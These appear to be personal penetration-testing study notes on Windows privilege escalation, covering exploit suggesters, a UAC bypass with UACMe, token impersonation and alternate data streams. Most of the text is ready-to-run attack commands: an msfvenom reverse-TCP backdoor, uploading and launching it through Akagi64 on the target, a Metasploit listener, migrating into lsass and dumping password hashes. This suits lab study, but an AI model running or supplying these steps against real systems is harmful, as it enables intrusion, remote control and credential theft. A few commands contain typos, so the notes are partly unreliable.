<h2> Windows Kernel Exploits </h2>
<h4> Windows-Exploit-Suggester </h4>

![[Screenshot_2025-09-11_18_48_58.png]]


after getting reverse shell :-

	There is also an inbuild exploitation of metasploit meterpreter
	meterpreter> getsystem
	

For metasploit press ctrl+z to background : 
```
search suggester
use post/multi/recon/local_exploit_suggester
```
		This will provide the list of exploits that can be carried on the target.
```
use exploit/
set SESSION
set LPORT
run
```

2nd Method with metaspolit meterpreter:
```
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
cd Windows-Exploit-Suggester
python2 windows-exploit-suggester --update
```
the above code will give yyyy-mm-dd.xsls file with latest windows vulnerability to test.


```
meterpreter> shell
c:/temp/ systeminfo

Output_sysinfo

```
copy the output_sysinfo and save in attacker with file name example sysinfo_target.txt .

```
python2 windows-exploit-suggester --database yyyy-mm-dd.xls --systeminfo sysinfo_target.txt 
```
		This will provide the list of exploits that can be carried on the target.


<h2> Bybassing UAC with UACMe </h2>
![[Pasted image 20250912133507.png]]

> we need to have access to a user account that is a part of the local administrators group on target system.
> The admin account must have default UAC settings.

> if UAC protection level is below **HIGH**.  Windows programs can be executed with elevated privileges without any consent.

> https://github.com/hfiref0x/UACME

`in target machine type the following command to view the users that have local administrative privilage `

```
net localgroup administrator
```

![[Pasted image 20250912150600.png]]
the above to commands to shift from 32 bit to 64 bit.

```
meterpreter> getuid
meterpreter> getprivs
meterpreter> shell
C:\windows\system32\ net user
C:\windows\system32\ net localgroup administrators
C:\windows\system32\ net user admin password123

`THE ABOVE COMMAND IS TO CHANGE PASSWORD. ACCESS IS DENIED SYSTEM ERROR 5 HAS OCCURED. THIS IS DUE TO UAC`
 
```

> the system requirements is the UAC must be set to default.
> we can use akagi32 key param or akagi64 key param.
> go to its github readme to understand on key.

`For more information go to [https://github.com/hfiref0x/UACME]`

```
git clone https://github.com/hfiref0x/UACME.git
```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > backdoor.exe
```

go to temp directory in target machine and upload backdoor.exe
```
meterpreter>cd /
meterpreter>cd C:\\Users\\admin\\AppData\\Local\\Temp
meterpreter>upload backdoor.exe
meterpreter>upload akagi64.exe
meterpreter>shell 
c:\temp\ Akagi64.exe 23 c:\temp\backdoor.exe
```

this will give a backdoor and dont forget to start a netcat listener 
check using getprivs this shows the privileges you have

```
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.31.2
set LPORT 4444
exploit
```
This is another terminal

when connected successfully
`use migrate <processID> to migrate into AUTHORITY level`
```
ps -S lsass.exe
migrate <Pid>
hashdump
```

<h2>Windows Access Tokens</h2>
>It is managed by Local Security Authority Subsystem Service.
![[Screenshot_2025-09-13_13_22_11.png]]
>The following are the privileges required for a successful impersonation attack:

1. SetAssignPrimayToken: allows a user to impersonate tokens.
2. SeCreateToken: Create an arbirary token with administrative privilege.
3. SeImpersonatePrivilege: Create a process with administrative privilege.

_> Incognito is a built in module of metasploit that allsows us to impersonate user tokens after successful exploitation.

after exploitation of the target system with meterpreter session:
```
sysinfo
pgrep explorer // 2512
migrate 2512  //access denied
getuid   //AUTHORITY\Local Service
getprivs
```
![[Pasted image 20250913134932.png]]
```
load incognito
exploit
list_token -u
```
![[Pasted image 20250913135201.png]]
```
impersonate_token "__"
getprivs
getuid
migrate <pid>
```
_> If you find no  token available in Delegation and Impersonation when list_token -u is performed then perform POTATO ATTACK.

This will generate a NT AUTHORITY\SYSTEM token. :)

<h2> Windows File Systetm Vulenerabilites </h2>
<h4> Alternate Data Streams </h4>
_>This is the one of the ways to hide malicious code in legitimate files _
![[Screenshot_2025-09-13_15_34_49.png]]
![[Screenshot_2025-09-13_15_43_44.png]]
Run the terminal as administrator to mklink

![[Screenshot_2025-09-13_15_43_55.png]]Alternate Data Streams is an NTFS and ext4 filesystem attribute?
False.